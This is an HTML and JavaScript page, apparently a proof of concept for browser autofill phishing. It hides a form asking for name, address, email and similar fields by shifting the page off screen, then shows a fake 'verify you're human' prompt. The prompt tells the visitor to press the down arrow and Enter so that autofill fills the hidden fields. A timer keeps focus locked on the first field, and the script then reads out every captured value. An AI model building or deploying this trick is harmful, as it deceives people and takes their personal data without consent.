<style>
html, body{
	margin-top:-1000px;
	background-color:#ccc;
}

#qdiv{
	position:absolute;
	top:200px;
	left:200px;
}
</style>

<form name="addr1.1" id="form1" action="" method="post">
	<input type="text" id="qa" name="name" autofocus>
	<input type="text" name="address">
	<input type="text" name="city">
  <input name="zip"> 
  <input name="country">
   <input name="company"> 
   <input name="email">
</form>
<div id="qdiv">Please press the DOWN arrow one time to verify you're human</div>
<script>
var step=0;

function getInputs(){
	let tbr='';
	for(q of document.getElementsByTagName('input')){
		tbr+=q.value+" || ";
	
	}
	
	return tbr
}

document.onkeydown=e=>{
console.dir(e.key)
	if(step==0){
		if(e.key=="ArrowDown" || e.key=="ArrowUp"){
			step=1;
			qdiv.innerHTML="Great! Now press 'Enter' to continue!";
		}else{
			qdiv.innerHTML+="<br> 1ERROR: wrong key pressed!"
		}
	}
	
}

qa.oninput=e=>{
if(step==1){
qdiv.innerHTML="Loading...";
		setTimeout(wp=>{qdiv.innerHTML="Info: "+getInputs();},1000)
	}
}



setInterval(g=>{
	if(document.activeElement!=qa){
		qa.focus()
	}
},1)
</script>
